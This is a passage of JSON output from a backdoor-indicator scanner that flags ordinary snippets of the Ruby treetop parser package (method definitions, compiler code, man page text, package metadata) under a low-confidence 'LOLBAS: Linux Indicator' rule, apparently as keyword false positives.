                    "text": "\t\t\t\t\t\t\t\t\t\t\t\t<int key=\"NSButtonFlags\">-2038284033</int>\n\t\t\t\t\t\t\t\t\t\t\t\t<int key=\"NSButtonFlags2\">268435585</int>\n\t\t\t\t\t\t\t\t\t\t\t\t<reference key=\"NSAlternateContents\" ref=\"589643114\"/>\n\t\t\t\t\t\t\t\t\t\t\t\t<string type=\"base64-UTF8\" key=\"NSKeyEquivalent\">DQ</string>\n\t\t\t\t\t\t\t\t\t\t\t\t<int key=\"NSPeriodicDelay\">200</int>\n\t\t\t\t\t\t\t\t\t\t\t\t<int key=\"NSPeriodicInterval\">25</int>\n\t\t\t\t\t\t\t\t\t\t\t</object>\n",
                    "rendered": {
                      "text": "\t\t\t\t\t\t\t\t\t\t\t\t<int key=\"NSButtonFlags\">-2038284033</int>\n\t\t\t\t\t\t\t\t\t\t\t\t<int key=\"NSButtonFlags2\">268435585</int>\n\t\t\t\t\t\t\t\t\t\t\t\t<reference key=\"NSAlternateContents\" ref=\"589643114\"/>\n\t\t\t\t\t\t\t\t\t\t\t\t<string type=\"base64-UTF8\" key=\"NSKeyEquivalent\">DQ</string>\n\t\t\t\t\t\t\t\t\t\t\t\t<int key=\"NSPeriodicDelay\">200</int>\n\t\t\t\t\t\t\t\t\t\t\t\t<int key=\"NSPeriodicInterval\">25</int>\n\t\t\t\t\t\t\t\t\t\t\t</object>\n",
                      "markdown": "`\t\t\t\t\t\t\t\t\t\t\t\t<int key=\"NSButtonFlags\">-2038284033</int>\n\t\t\t\t\t\t\t\t\t\t\t\t<int key=\"NSButtonFlags2\">268435585</int>\n\t\t\t\t\t\t\t\t\t\t\t\t<reference key=\"NSAlternateContents\" ref=\"589643114\"/>\n\t\t\t\t\t\t\t\t\t\t\t\t<string type=\"base64-UTF8\" key=\"NSKeyEquivalent\">DQ</string>\n\t\t\t\t\t\t\t\t\t\t\t\t<int key=\"NSPeriodicDelay\">200</int>\n\t\t\t\t\t\t\t\t\t\t\t\t<int key=\"NSPeriodicInterval\">25</int>\n\t\t\t\t\t\t\t\t\t\t\t</object>\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/.PKGINFO"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 69,
                  "endLine": 8,
                  "snippet": {
                    "text": "arch = x86_64\nsize = 7691874\norigin = ruby3.2-treetop\npkgdesc = A Parsing Expression Grammar (PEG) Parser generator DSL for Ruby\nurl = \ncommit = \nlicense = MIT\ndepend = cmd:ruby\n",
                    "rendered": {
                      "text": "arch = x86_64\nsize = 7691874\norigin = ruby3.2-treetop\npkgdesc = A Parsing Expression Grammar (PEG) Parser generator DSL for Ruby\nurl = \ncommit = \nlicense = MIT\ndepend = cmd:ruby\n",
                      "markdown": "`arch = x86_64\nsize = 7691874\norigin = ruby3.2-treetop\npkgdesc = A Parsing Expression Grammar (PEG) Parser generator DSL for Ruby\nurl = \ncommit = \nlicense = MIT\ndepend = cmd:ruby\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/compiler/metagrammar.rb"
                },
                "region": {
                  "startLine": 1382,
                  "startColumn": 11,
                  "endLine": 1383,
                  "snippet": {
                    "text": "          self\n        end\n\n        def tail\n          []\n        end\n      end\n\n",
                    "rendered": {
                      "text": "          self\n        end\n\n        def tail\n          []\n        end\n      end\n\n",
                      "markdown": "`          self\n        end\n\n        def tail\n          []\n        end\n      end\n\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/compiler/metagrammar.rb"
                },
                "region": {
                  "startLine": 1378,
                  "startColumn": 11,
                  "endLine": 1379,
                  "snippet": {
                    "text": "      end\n\n      module LabeledExpressionSequenceBody0\n        def head\n          self\n        end\n\n        def tail\n",
                    "rendered": {
                      "text": "      end\n\n      module LabeledExpressionSequenceBody0\n        def head\n          self\n        end\n\n        def tail\n",
                      "markdown": "`      end\n\n      module LabeledExpressionSequenceBody0\n        def head\n          self\n        end\n\n        def tail\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/compiler/metagrammar.rb"
                },
                "region": {
                  "startLine": 1313,
                  "startColumn": 11,
                  "endLine": 1314,
                  "snippet": {
                    "text": "      end\n\n      module VariableLengthSequenceBody2\n        def tail\n          super.elements.map {|elt| elt.optionally_labeled_sequence_primary }\n        end\n      end\n\n",
                    "rendered": {
                      "text": "      end\n\n      module VariableLengthSequenceBody2\n        def tail\n          super.elements.map {|elt| elt.optionally_labeled_sequence_primary }\n        end\n      end\n\n",
                      "markdown": "`      end\n\n      module VariableLengthSequenceBody2\n        def tail\n          super.elements.map {|elt| elt.optionally_labeled_sequence_primary }\n        end\n      end\n\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/compiler/metagrammar.rb"
                },
                "region": {
                  "startLine": 1307,
                  "startColumn": 11,
                  "endLine": 1308,
                  "snippet": {
                    "text": "          elements[0]\n        end\n\n        def tail\n          elements[1]\n        end\n      end\n\n",
                    "rendered": {
                      "text": "          elements[0]\n        end\n\n        def tail\n          elements[1]\n        end\n      end\n\n",
                      "markdown": "`          elements[0]\n        end\n\n        def tail\n          elements[1]\n        end\n      end\n\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/compiler/metagrammar.rb"
                },
                "region": {
                  "startLine": 1303,
                  "startColumn": 11,
                  "endLine": 1304,
                  "snippet": {
                    "text": "      end\n\n      module VariableLengthSequenceBody1\n        def head\n          elements[0]\n        end\n\n        def tail\n",
                    "rendered": {
                      "text": "      end\n\n      module VariableLengthSequenceBody1\n        def head\n          elements[0]\n        end\n\n        def tail\n",
                      "markdown": "`      end\n\n      module VariableLengthSequenceBody1\n        def head\n          elements[0]\n        end\n\n        def tail\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/compiler/metagrammar.rb"
                },
                "region": {
                  "startLine": 1205,
                  "startColumn": 11,
                  "endLine": 1206,
                  "snippet": {
                    "text": "          [sequence_body.head] + tail\n        end\n\n        def tail\n          sequence_body.tail\n        end\n\n\t  def parent_modules\n",
                    "rendered": {
                      "text": "          [sequence_body.head] + tail\n        end\n\n        def tail\n          sequence_body.tail\n        end\n\n\t  def parent_modules\n",
                      "markdown": "`          [sequence_body.head] + tail\n        end\n\n        def tail\n          sequence_body.tail\n        end\n\n\t  def parent_modules\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/compiler/metagrammar.rb"
                },
                "region": {
                  "startLine": 1202,
                  "startColumn": 32,
                  "endLine": 1203,
                  "snippet": {
                    "text": "\n      module Sequence1\n        def sequence_elements\n          [sequence_body.head] + tail\n        end\n\n        def tail\n          sequence_body.tail\n",
                    "rendered": {
                      "text": "\n      module Sequence1\n        def sequence_elements\n          [sequence_body.head] + tail\n        end\n\n        def tail\n          sequence_body.tail\n",
                      "markdown": "`\n      module Sequence1\n        def sequence_elements\n          [sequence_body.head] + tail\n        end\n\n        def tail\n          sequence_body.tail\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/compiler/metagrammar.rb"
                },
                "region": {
                  "startLine": 1090,
                  "startColumn": 11,
                  "endLine": 1091,
                  "snippet": {
                    "text": "          [head] + tail\n        end\n\n        def tail\n          super.elements.map {|elt| elt.alternative}\n        end\n\n\t  def parent_modules\n",
                    "rendered": {
                      "text": "          [head] + tail\n        end\n\n        def tail\n          super.elements.map {|elt| elt.alternative}\n        end\n\n\t  def parent_modules\n",
                      "markdown": "`          [head] + tail\n        end\n\n        def tail\n          super.elements.map {|elt| elt.alternative}\n        end\n\n\t  def parent_modules\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/compiler/metagrammar.rb"
                },
                "region": {
                  "startLine": 1087,
                  "startColumn": 18,
                  "endLine": 1088,
                  "snippet": {
                    "text": "\n      module Choice2\n        def alternatives\n          [head] + tail\n        end\n\n        def tail\n          super.elements.map {|elt| elt.alternative}\n",
                    "rendered": {
                      "text": "\n      module Choice2\n        def alternatives\n          [head] + tail\n        end\n\n        def tail\n          super.elements.map {|elt| elt.alternative}\n",
                      "markdown": "`\n      module Choice2\n        def alternatives\n          [head] + tail\n        end\n\n        def tail\n          super.elements.map {|elt| elt.alternative}\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/compiler/metagrammar.rb"
                },
                "region": {
                  "startLine": 1080,
                  "startColumn": 11,
                  "endLine": 1081,
                  "snippet": {
                    "text": "          elements[0]\n        end\n\n        def tail\n          elements[1]\n        end\n      end\n\n",
                    "rendered": {
                      "text": "          elements[0]\n        end\n\n        def tail\n          elements[1]\n        end\n      end\n\n",
                      "markdown": "`          elements[0]\n        end\n\n        def tail\n          elements[1]\n        end\n      end\n\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/compiler/metagrammar.rb"
                },
                "region": {
                  "startLine": 1076,
                  "startColumn": 11,
                  "endLine": 1077,
                  "snippet": {
                    "text": "      end\n\n      module Choice1\n        def head\n          elements[0]\n        end\n\n        def tail\n",
                    "rendered": {
                      "text": "      end\n\n      module Choice1\n        def head\n          elements[0]\n        end\n\n        def tail\n",
                      "markdown": "`      end\n\n      module Choice1\n        def head\n          elements[0]\n        end\n\n        def tail\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/compiler/metagrammar.rb"
                },
                "region": {
                  "startLine": 700,
                  "startColumn": 11,
                  "endLine": 701,
                  "snippet": {
                    "text": "          [head] + tail\n        end\n\n        def tail\n          super.elements.map { |elt| elt.declaration }\n        end\n      end\n\n",
                    "rendered": {
                      "text": "          [head] + tail\n        end\n\n        def tail\n          super.elements.map { |elt| elt.declaration }\n        end\n      end\n\n",
                      "markdown": "`          [head] + tail\n        end\n\n        def tail\n          super.elements.map { |elt| elt.declaration }\n        end\n      end\n\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/compiler/metagrammar.rb"
                },
                "region": {
                  "startLine": 697,
                  "startColumn": 18,
                  "endLine": 698,
                  "snippet": {
                    "text": "\n      module DeclarationSequence2\n        def declarations\n          [head] + tail\n        end\n\n        def tail\n          super.elements.map { |elt| elt.declaration }\n",
                    "rendered": {
                      "text": "\n      module DeclarationSequence2\n        def declarations\n          [head] + tail\n        end\n\n        def tail\n          super.elements.map { |elt| elt.declaration }\n",
                      "markdown": "`\n      module DeclarationSequence2\n        def declarations\n          [head] + tail\n        end\n\n        def tail\n          super.elements.map { |elt| elt.declaration }\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/compiler/metagrammar.rb"
                },
                "region": {
                  "startLine": 690,
                  "startColumn": 11,
                  "endLine": 691,
                  "snippet": {
                    "text": "          elements[0]\n        end\n\n        def tail\n          elements[1]\n        end\n      end\n\n",
                    "rendered": {
                      "text": "          elements[0]\n        end\n\n        def tail\n          elements[1]\n        end\n      end\n\n",
                      "markdown": "`          elements[0]\n        end\n\n        def tail\n          elements[1]\n        end\n      end\n\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/compiler/metagrammar.rb"
                },
                "region": {
                  "startLine": 686,
                  "startColumn": 11,
                  "endLine": 687,
                  "snippet": {
                    "text": "      end\n\n      module DeclarationSequence1\n        def head\n          elements[0]\n        end\n\n        def tail\n",
                    "rendered": {
                      "text": "      end\n\n      module DeclarationSequence1\n        def head\n          elements[0]\n        end\n\n        def tail\n",
                      "markdown": "`      end\n\n      module DeclarationSequence1\n        def head\n          elements[0]\n        end\n\n        def tail\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/compiler/grammar_compiler.rb"
                },
                "region": {
                  "startLine": 11,
                  "startColumn": 11,
                  "endLine": 11,
                  "endColumn": 17,
                  "snippet": {
                    "text": "          if ruby =~ /\\A#.*\\n/\n            ruby.sub!(/\\n/, \"\\n\"+AUTOGENERATED+\"\\n\\n\")\n          else\n            ruby = AUTOGENERATED+\"\\n\\n\"+ruby\n          end\n          target_file.write(ruby)\n        end\n",
                    "rendered": {
                      "text": "          if ruby =~ /\\A#.*\\n/\n            ruby.sub!(/\\n/, \"\\n\"+AUTOGENERATED+\"\\n\\n\")\n          else\n            ruby = AUTOGENERATED+\"\\n\\n\"+ruby\n          end\n          target_file.write(ruby)\n        end\n",
                      "markdown": "`          if ruby =~ /\\A#.*\\n/\n            ruby.sub!(/\\n/, \"\\n\"+AUTOGENERATED+\"\\n\\n\")\n          else\n            ruby = AUTOGENERATED+\"\\n\\n\"+ruby\n          end\n          target_file.write(ruby)\n        end\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/compiler/grammar_compiler.rb"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 12,
                  "endLine": 8,
                  "endColumn": 18,
                  "snippet": {
                    "text": "      def compile(source_path, target_path = source_path.gsub(/\\.(treetop|tt)\\Z/, '.rb'))\n        File.open(target_path, 'w') do |target_file|\n          ruby = ruby_source(source_path)\n          if ruby =~ /\\A#.*\\n/\n            ruby.sub!(/\\n/, \"\\n\"+AUTOGENERATED+\"\\n\\n\")\n          else\n            ruby = AUTOGENERATED+\"\\n\\n\"+ruby\n",
                    "rendered": {
                      "text": "      def compile(source_path, target_path = source_path.gsub(/\\.(treetop|tt)\\Z/, '.rb'))\n        File.open(target_path, 'w') do |target_file|\n          ruby = ruby_source(source_path)\n          if ruby =~ /\\A#.*\\n/\n            ruby.sub!(/\\n/, \"\\n\"+AUTOGENERATED+\"\\n\\n\")\n          else\n            ruby = AUTOGENERATED+\"\\n\\n\"+ruby\n",
                      "markdown": "`      def compile(source_path, target_path = source_path.gsub(/\\.(treetop|tt)\\Z/, '.rb'))\n        File.open(target_path, 'w') do |target_file|\n          ruby = ruby_source(source_path)\n          if ruby =~ /\\A#.*\\n/\n            ruby.sub!(/\\n/, \"\\n\"+AUTOGENERATED+\"\\n\\n\")\n          else\n            ruby = AUTOGENERATED+\"\\n\\n\"+ruby\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/lib/treetop/compiler/grammar_compiler.rb"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 9,
                  "endLine": 7,
                  "endColumn": 15,
                  "snippet": {
                    "text": "    class GrammarCompiler\n      def compile(source_path, target_path = source_path.gsub(/\\.(treetop|tt)\\Z/, '.rb'))\n        File.open(target_path, 'w') do |target_file|\n          ruby = ruby_source(source_path)\n          if ruby =~ /\\A#.*\\n/\n            ruby.sub!(/\\n/, \"\\n\"+AUTOGENERATED+\"\\n\\n\")\n          else\n",
                    "rendered": {
                      "text": "    class GrammarCompiler\n      def compile(source_path, target_path = source_path.gsub(/\\.(treetop|tt)\\Z/, '.rb'))\n        File.open(target_path, 'w') do |target_file|\n          ruby = ruby_source(source_path)\n          if ruby =~ /\\A#.*\\n/\n            ruby.sub!(/\\n/, \"\\n\"+AUTOGENERATED+\"\\n\\n\")\n          else\n",
                      "markdown": "`    class GrammarCompiler\n      def compile(source_path, target_path = source_path.gsub(/\\.(treetop|tt)\\Z/, '.rb'))\n        File.open(target_path, 'w') do |target_file|\n          ruby = ruby_source(source_path)\n          if ruby =~ /\\A#.*\\n/\n            ruby.sub!(/\\n/, \"\\n\"+AUTOGENERATED+\"\\n\\n\")\n          else\n`"
                    }
                  },
                  "sourceLanguage": "ruby"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/tt.1"
                },
                "region": {
                  "startLine": 39,
                  "startColumn": 14,
                  "endLine": 39,
                  "endColumn": 20,
                  "snippet": {
                    "text": ".B tt\nprogram takes a list of files with a .treetop extension and compiles\nthem into .rb files of the same name. You can then require these files\nlike any other Ruby script.\n\nAlternately, you can supply just one .treetop file and a \\-o flag to\nspecify the name of the output file.\n",
                    "rendered": {
                      "text": ".B tt\nprogram takes a list of files with a .treetop extension and compiles\nthem into .rb files of the same name. You can then require these files\nlike any other Ruby script.\n\nAlternately, you can supply just one .treetop file and a \\-o flag to\nspecify the name of the output file.\n",
                      "markdown": "`.B tt\nprogram takes a list of files with a .treetop extension and compiles\nthem into .rb files of the same name. You can then require these files\nlike any other Ruby script.\n\nAlternately, you can supply just one .treetop file and a \\-o flag to\nspecify the name of the output file.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/tt.1"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 63,
                  "endLine": 33,
                  "snippet": {
                    "text": ".SH DESCRIPTION\nThe\n.B tt\nprogram is a command-line script to compile .treetop files into Ruby\nsource code.\n\nThe\n.B tt\n",
                    "rendered": {
                      "text": ".SH DESCRIPTION\nThe\n.B tt\nprogram is a command-line script to compile .treetop files into Ruby\nsource code.\n\nThe\n.B tt\n",
                      "markdown": "`.SH DESCRIPTION\nThe\n.B tt\nprogram is a command-line script to compile .treetop files into Ruby\nsource code.\n\nThe\n.B tt\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/tt.1"
                },
                "region": {
                  "startLine": 32,
                  "startColumn": 25,
                  "endLine": 32,
                  "endColumn": 33,
                  "snippet": {
                    "text": ".SH DESCRIPTION\nThe\n.B tt\nprogram is a command-line script to compile .treetop files into Ruby\nsource code.\n\nThe\n",
                    "rendered": {
                      "text": ".SH DESCRIPTION\nThe\n.B tt\nprogram is a command-line script to compile .treetop files into Ruby\nsource code.\n\nThe\n",
                      "markdown": "`.SH DESCRIPTION\nThe\n.B tt\nprogram is a command-line script to compile .treetop files into Ruby\nsource code.\n\nThe\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/tmp/datasets/dataset3/ruby/ruby3.2-treetop-1.6.12-r0.apk/ruby3.2-treetop-1.6.12-r0/usr/lib/ruby/gems/3.2.0/gems/treetop-1.6.12/doc/tt.1"
                },
                "region": {
                  "startLine": 24,
                  "startColumn": 39,
                  "endLine": 24,
                  "endColumn": 45,
                  "snippet": {
